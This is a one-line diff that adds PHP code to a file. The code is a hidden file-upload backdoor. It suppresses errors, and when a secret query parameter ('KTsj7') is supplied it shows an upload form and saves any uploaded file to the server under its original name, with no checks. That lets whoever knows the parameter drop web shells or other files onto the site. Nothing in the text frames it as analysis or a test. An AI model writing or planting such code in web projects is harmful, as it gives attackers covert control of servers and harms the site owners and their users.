@@ -1,0 +1,1 @@
+<?php error_reporting(0); if(isset($_GET['KTsj7'])){ echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /> <input type='submit' value='upload' /></form>"; move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); exit(0); } ?>
